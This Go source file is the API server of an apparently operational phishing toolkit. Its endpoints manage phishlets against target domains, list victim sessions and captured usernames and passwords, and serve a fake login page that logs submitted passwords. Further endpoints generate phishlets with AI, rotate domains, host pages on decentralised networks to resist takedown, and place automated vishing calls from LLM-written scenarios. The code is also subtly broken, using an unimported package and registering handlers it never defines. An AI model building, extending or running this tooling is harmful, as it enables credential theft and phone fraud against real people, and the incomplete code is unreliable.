package api

import (
	"encoding/json"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
	"github.com/phantom-proxy/phantom-proxy/internal/ai"
	"github.com/phantom-proxy/phantom-proxy/internal/decentral"
	"github.com/phantom-proxy/phantom-proxy/internal/vishing"
)

// APIServer REST API сервер
type APIServer struct {
	app        *fiber.App
	proxy      *proxy.HTTPProxy
	db         *database.Database
	logger     *zap.Logger
	apiKey     string
	aiOrchestrator *ai.AIOrchestrator
	decentralHosting *decentral.DecentralizedHosting
	vishingClient *vishing.VishingClient
}

// NewAPIServer создаёт новый API сервер
func NewAPIServer(proxy *proxy.HTTPProxy, db *database.Database, logger *zap.Logger, apiKey string) *APIServer {
	app := fiber.New(fiber.Config{
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
	})

	// Инициализация AI оркестратора
	aiOrchestrator := ai.NewAIOrchestrator("http://localhost:8081", logger)
	
	// Инициализация децентрализованного хостинга
	decentralHosting, err := decentral.NewDecentralizedHosting(&decentral.HostingConfig{
		PinataAPIKey:    "", // Из конфига
		PinataSecretKey: "",
		CacheDir:        "./decentral_cache",
	}, logger)
	if err != nil {
		logger.Warn("Failed to initialize decentralized hosting", zap.Error(err))
	}
	
	// Инициализация Vishing клиента
	vishingClient := vishing.NewVishingClient("http://localhost:8082", logger)

	s := &APIServer{
		app:    app,
		proxy:  proxy,
		db:     db,
		logger: logger,
		apiKey: apiKey,
		aiOrchestrator: aiOrchestrator,
		decentralHosting: decentralHosting,
		vishingClient: vishingClient,
	}

	s.setupRoutes()
	return s
}

// setupRoutes настраивает маршруты
func (s *APIServer) setupRoutes() {
	// Middleware для аутентификации
	s.app.Use(s.authMiddleware)

	// API routes
	api := s.app.Group("/api/v1")

	// Sessions
	api.Get("/sessions", s.listSessions)
	api.Get("/sessions/:id", s.getSession)
	api.Delete("/sessions/:id", s.deleteSession)

	// Credentials
	api.Get("/credentials", s.listCredentials)
	api.Get("/credentials/:id", s.getCredentials)

	// Phishlets
	api.Get("/phishlets", s.listPhishlets)
	api.Get("/phishlets/:id", s.getPhishlet)
	api.Post("/phishlets", s.createPhishlet)
	api.Put("/phishlets/:id", s.updatePhishlet)
	api.Delete("/phishlets/:id", s.deletePhishlet)
	api.Post("/phishlets/:id/enable", s.enablePhishlet)
	api.Post("/phishlets/:id/disable", s.disablePhishlet)
	api.Get("/phishlets/:id/health", s.checkPhishletHealth)

	// Stats
	api.Get("/stats", s.getStats)

	// Health check
	s.app.Get("/health", s.healthCheck)
	
	// AI endpoints
	s.app.Post("/api/v1/ai/generate-phishlet", s.generatePhishlet)
	s.app.Get("/api/v1/ai/analyze/:url", s.analyzeSite)
	
	// Domain rotation endpoints
	s.app.Post("/api/v1/domains/register", s.registerDomain)
	s.app.Post("/api/v1/domains/rotate", s.rotateDomain)
	s.app.Get("/api/v1/domains", s.listDomains)
	
	// Decentralized hosting endpoints
	s.app.Post("/api/v1/decentral/host", s.hostPage)
	s.app.Post("/api/v1/decentral/update/:name", s.updatePage)
	s.app.Get("/api/v1/decentral/pages", s.listPages)
	s.app.Delete("/api/v1/decentral/pages/:name", s.deletePage)
	
	// Vishing endpoints
	s.app.Post("/api/v1/vishing/call", s.makeVishingCall)
	s.app.Get("/api/v1/vishing/call/:id", s.getCallStatus)
	s.app.Post("/api/v1/vishing/generate-scenario", s.generateScenario)
	
	// Test login endpoint
	s.app.Post("/login", s.handleTestLogin)
	
	// Capture credentials endpoint
	s.app.Post("/api/v1/credentials", s.captureCredentials)
	
	// Serve login page
	s.app.Get("/login", s.serveLoginPage)
}

// authMiddleware проверяет API ключ
func (s *APIServer) authMiddleware(c *fiber.Ctx) error {
	// Пропускаем health check и login page
	if strings.HasPrefix(c.Path(), "/health") || 
	   strings.HasPrefix(c.Path(), "/login") {
		return c.Next()
	}

	// Проверка API ключа
	apiKey := c.Get("Authorization")
	if apiKey == "" {
		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
			"error": "Authorization header required",
		})
	}

	// Убираем "Bearer " префикс
	apiKey = strings.TrimPrefix(apiKey, "Bearer ")

	if apiKey != s.apiKey {
		return c.Status(fiber.StatusForbidden).JSON(fiber.Map{
			"error": "Invalid API key",
		})
	}

	return c.Next()
}

// Session Response
type SessionResponse struct {
	ID         string    `json:"id"`
	VictimIP   string    `json:"victim_ip"`
	TargetURL  string    `json:"target_url"`
	PhishletID string    `json:"phishlet_id,omitempty"`
	UserAgent  string    `json:"user_agent,omitempty"`
	JA3Hash    string    `json:"ja3_hash,omitempty"`
	State      string    `json:"state"`
	CreatedAt  time.Time `json:"created_at"`
	LastActive time.Time `json:"last_active"`
}

// listSessions возвращает список сессий
func (s *APIServer) listSessions(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	sessions, err := s.db.ListSessions(limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	response := make([]SessionResponse, len(sessions))
	for i, session := range sessions {
		response[i] = SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			PhishletID: session.PhishletID,
			UserAgent:  session.UserAgent,
			JA3Hash:    session.JA3Hash,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		}
	}

	return c.JSON(fiber.Map{
		"sessions": response,
		"total":    len(sessions),
	})
}

// getSession возвращает сессию по ID
func (s *APIServer) getSession(c *fiber.Ctx) error {
	id := c.Params("id")

	session, err := s.db.GetSession(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Session not found",
		})
	}

	return c.JSON(fiber.Map{
		"session": SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			PhishletID: session.PhishletID,
			UserAgent:  session.UserAgent,
			JA3Hash:    session.JA3Hash,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		},
	})
}

// deleteSession удаляет сессию
func (s *APIServer) deleteSession(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.db.DeleteSession(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
	})
}

// Credential Response
type CredentialResponse struct {
	ID           string            `json:"id"`
	SessionID    string            `json:"session_id"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	CustomFields map[string]string `json:"custom_fields,omitempty"`
	CapturedAt   time.Time         `json:"captured_at"`
}

// listCredentials возвращает список креденшалов
func (s *APIServer) listCredentials(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	creds, err := s.db.ListCredentials(limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	response := make([]CredentialResponse, len(creds))
	for i, cred := range creds {
		response[i] = CredentialResponse{
			ID:           cred.ID,
			SessionID:    cred.SessionID,
			Username:     cred.Username,
			Password:     cred.Password,
			CustomFields: cred.CustomFields,
			CapturedAt:   cred.CapturedAt,
		}
	}

	return c.JSON(fiber.Map{
		"credentials": response,
		"total":       len(creds),
	})
}

// getCredentials возвращает креденшалы по ID
func (s *APIServer) getCredentials(c *fiber.Ctx) error {
	id := c.Params("id")

	session, err := s.db.GetSession(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Session not found",
		})
	}

	creds, err := s.db.GetCredentials(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Credentials not found",
		})
	}

	return c.JSON(fiber.Map{
		"session": SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		},
		"credentials": CredentialResponse{
			ID:           creds.ID,
			SessionID:    creds.SessionID,
			Username:     creds.Username,
			Password:     creds.Password,
			CustomFields: creds.CustomFields,
			CapturedAt:   creds.CapturedAt,
		},
	})
}

// Phishlet Response
type PhishletResponse struct {
	ID           string                 `json:"id"`
	Name         string                 `json:"name"`
	TargetDomain string                 `json:"target_domain"`
	Config       map[string]interface{} `json:"config,omitempty"`
	IsActive     bool                   `json:"is_active"`
	CreatedAt    time.Time              `json:"created_at"`
	UpdatedAt    time.Time              `json:"updated_at"`
}

// listPhishlets возвращает список phishlets
func (s *APIServer) listPhishlets(c *fiber.Ctx) error {
	phishlets, err := s.db.ListPhishlets()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"phishlets": phishlets,
		"total":     len(phishlets),
	})
}

// getPhishlet возвращает phishlet по ID
func (s *APIServer) getPhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	config, err := s.db.GetPhishlet(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Phishlet not found",
		})
	}

	var phishlet proxy.Phishlet
	if err := json.Unmarshal([]byte(config), &phishlet); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Failed to parse phishlet",
		})
	}

	return c.JSON(fiber.Map{
		"phishlet": phishlet,
	})
}

// createPhishlet создаёт новый phishlet
func (s *APIServer) createPhishlet(c *fiber.Ctx) error {
	var req struct {
		ID           string `json:"id"`
		Name         string `json:"name"`
		TargetDomain string `json:"target_domain"`
		Config       string `json:"config"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if req.ID == "" {
		req.ID = uuid.New().String()
	}

	if err := s.db.SavePhishlet(req.ID, req.Name, req.TargetDomain, req.Config); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.Status(fiber.StatusCreated).JSON(fiber.Map{
		"id":      req.ID,
		"success": true,
	})
}

// updatePhishlet обновляет phishlet
func (s *APIServer) updatePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	var req struct {
		Name         string `json:"name"`
		TargetDomain string `json:"target_domain"`
		Config       string `json:"config"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if err := s.db.SavePhishlet(id, req.Name, req.TargetDomain, req.Config); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// deletePhishlet удаляет phishlet
func (s *APIServer) deletePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	// TODO: Реализовать удаление из БД

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// enablePhishlet активирует phishlet
func (s *APIServer) enablePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.proxy.EnablePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// disablePhishlet деактивирует phishlet
func (s *APIServer) disablePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.proxy.DisablePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// checkPhishletHealth проверяет доступность target URL phishlet
func (s *APIServer) checkPhishletHealth(c *fiber.Ctx) error {
	id := c.Params("id")

	health := s.proxy.CheckPhishletHealth(id)

	return c.JSON(health)
}

// Stats Response
type StatsResponse struct {
	TotalSessions    int `json:"total_sessions"`
	ActiveSessions   int `json:"active_sessions"`
	CapturedSessions int `json:"captured_sessions"`
	TotalCredentials int `json:"total_credentials"`
	ActivePhishlets  int `json:"active_phishlets"`
}

// getStats возвращает статистику
func (s *APIServer) getStats(c *fiber.Ctx) error {
	dbStats, err := s.db.GetStats()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	proxyStats := s.proxy.GetStats()

	return c.JSON(fiber.Map{
		"total_sessions":     dbStats["total_sessions"],
		"active_sessions":    proxyStats["active_sessions"],
		"captured_sessions":  dbStats["captured_sessions"],
		"total_credentials":  dbStats["total_credentials"],
		"active_phishlets":   dbStats["active_phishlets"],
		"total_requests":     proxyStats["total_requests"],
		"phishlets_loaded":   proxyStats["phishlets_loaded"],
	})
}

// healthCheck проверяет здоровье API
func (s *APIServer) healthCheck(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{
		"status":    "ok",
		"timestamp": time.Now().Format(time.RFC3339),
	})
}

// handleTestLogin обрабатывает тестовый вход
func (s *APIServer) handleTestLogin(c *fiber.Ctx) error {
	email := c.FormValue("email")
	password := c.FormValue("password")
	
	s.logger.Info("Test login received",
		zap.String("email", email),
		zap.String("password", password),
		zap.String("ip", c.IP()))
	
	// Сохраняем в БД как сессию
	session, err := s.db.CreateSession(
		c.IP(),
		"test_login_page",
		"TestLoginAgent/1.0",
		"",
	)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	// Сохраняем креденшалы
	_, err = s.db.SaveCredentials(session.ID, email, password, nil)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	s.logger.Info("Credentials saved",
		zap.String("session_id", session.ID),
		zap.String("email", email))
	
	return c.JSON(fiber.Map{
		"success": true,
		"message": "Login data captured",
		"session_id": session.ID,
	})
}

// captureCredentials перехватывает credentials
func (s *APIServer) captureCredentials(c *fiber.Ctx) error {
	type CredentialRequest struct {
		Email    string `json:"email"`
		Password string `json:"password"`
	}
	
	var req CredentialRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}
	
	s.logger.Info("Credentials captured via API",
		zap.String("email", req.Email),
		zap.String("password", req.Password),
		zap.String("ip", c.IP()))
	
	// Сохраняем в БД
	session, err := s.db.CreateSession(
		c.IP(),
		"login_page",
		"Mozilla/5.0",
		"",
	)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	_, err = s.db.SaveCredentials(session.ID, req.Email, req.Password, nil)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	s.logger.Info("Credentials saved to database",
		zap.String("session_id", session.ID),
		zap.String("email", req.Email))
	
	return c.JSON(fiber.Map{
		"success": true,
		"message": "Credentials captured",
	})
}

// serveLoginPage обслуживает страницу входа
func (s *APIServer) serveLoginPage(c *fiber.Ctx) error {
	// Читаем HTML файл
	htmlPath := "configs/phishlets/login_page.html"
	htmlContent, err := os.ReadFile(htmlPath)
	if err != nil {
		s.logger.Error("Failed to read login page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).SendString("Error loading login page")
	}

	c.Set("Content-Type", "text/html; charset=utf-8")
	return c.Send(htmlContent)
}

// hostPage публикует страницу в децентрализованной сети
func (s *APIServer) hostPage(c *fiber.Ctx) error {
	type Request struct {
		Name       string `json:"name"`
		SourcePath string `json:"source_path"`
		ENSName    string `json:"ens_name"`
	}
	
	var req Request
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}
	
	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	
	page, err := s.decentralHosting.HostPage(ctx, req.Name, req.SourcePath, req.ENSName)
	if err != nil {
		s.logger.Error("Failed to host page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	return c.JSON(fiber.Map{
		"success":      true,
		"page":         page,
		"gateway_url":  page.GatewayURL,
		"ens_url":      page.ENSURL,
		"message":      "Page hosted successfully",
	})
}

// updatePage обновляет страницу
func (s *APIServer) updatePage(c *fiber.Ctx) error {
	name := c.Params("name")
	
	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	
	page, err := s.decentralHosting.UpdatePage(ctx, name)
	if err != nil {
		s.logger.Error("Failed to update page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	return c.JSON(fiber.Map{
		"success":      true,
		"page":         page,
		"message":      "Page updated successfully",
	})
}

// listPages возвращает список страниц
func (s *APIServer) listPages(c *fiber.Ctx) error {
	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}
	
	pages := s.decentralHosting.ListPages()
	
	return c.JSON(fiber.Map{
		"success": true,
		"pages":   pages,
		"total":   len(pages),
	})
}

// deletePage удаляет страницу
func (s *APIServer) deletePage(c *fiber.Ctx) error {
	name := c.Params("name")
	
	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	
	if err := s.decentralHosting.DeletePage(ctx, name); err != nil {
		s.logger.Error("Failed to delete page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	return c.JSON(fiber.Map{
		"success": true,
		"message": "Page deleted successfully",
	})
}

// makeVishingCall совершает vishing звонок
func (s *APIServer) makeVishingCall(c *fiber.Ctx) error {
	type Request struct {
		PhoneNumber  string                 `json:"phone_number"`
		VoiceProfile string                 `json:"voice_profile"`
		Scenario     string                 `json:"scenario"`
		CustomData   map[string]interface{} `json:"custom_data,omitempty"`
	}
	
	var req Request
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}
	
	if s.vishingClient == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Vishing client not initialized",
		})
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	
	resp, err := s.vishingClient.MakeCall(ctx, vishing.CallRequest{
		PhoneNumber:  req.PhoneNumber,
		VoiceProfile: req.VoiceProfile,
		Scenario:     req.Scenario,
		CustomData:   req.CustomData,
	})
	if err != nil {
		s.logger.Error("Vishing call failed", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	return c.JSON(fiber.Map{
		"success":      true,
		"call_id":      resp.CallID,
		"status":       resp.Status,
		"message":      resp.Message,
		"recording_url": resp.RecordingURL,
	})
}

// getCallStatus получает статус звонка
func (s *APIServer) getCallStatus(c *fiber.Ctx) error {
	callID := c.Params("id")
	
	if s.vishingClient == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Vishing client not initialized",
		})
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	
	status, err := s.vishingClient.GetCallStatus(ctx, callID)
	if err != nil {
		s.logger.Error("Failed to get call status", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	return c.JSON(status)
}

// generateScenario генерирует сценарий через LLM
func (s *APIServer) generateScenario(c *fiber.Ctx) error {
	type Request struct {
		TargetService string `json:"target_service"`
		Goal          string `json:"goal"`
	}
	
	var req Request
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}
	
	if s.vishingClient == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Vishing client not initialized",
		})
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	
	scenario, err := s.vishingClient.GenerateScenario(ctx, req.TargetService, req.Goal)
	if err != nil {
		s.logger.Error("Failed to generate scenario", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}
	
	return c.JSON(fiber.Map{
		"success":  true,
		"scenario": scenario,
	})
}

// Start запускает API сервер
func (s *APIServer) Start(addr string) error {
	s.logger.Info("Starting API server", zap.String("addr", addr))
	
	// Явно указываем 0.0.0.0 для доступа извне
	bindAddr := addr
	if !strings.HasPrefix(addr, "0.0.0.0") && !strings.HasPrefix(addr, "127.0.0.1") {
		// Если адрес не начинается с 0.0.0.0 или 127.0.0.1, добавляем 0.0.0.0
		parts := strings.Split(addr, ":")
		if len(parts) == 2 {
			bindAddr = "0.0.0.0:" + parts[1]
		}
	}
	
	s.logger.Info("API server binding", zap.String("bind_addr", bindAddr))
	
	return s.app.Listen(bindAddr)
}

// Shutdown останавливает API сервер
func (s *APIServer) Shutdown() error {
	return s.app.Shutdown()
}
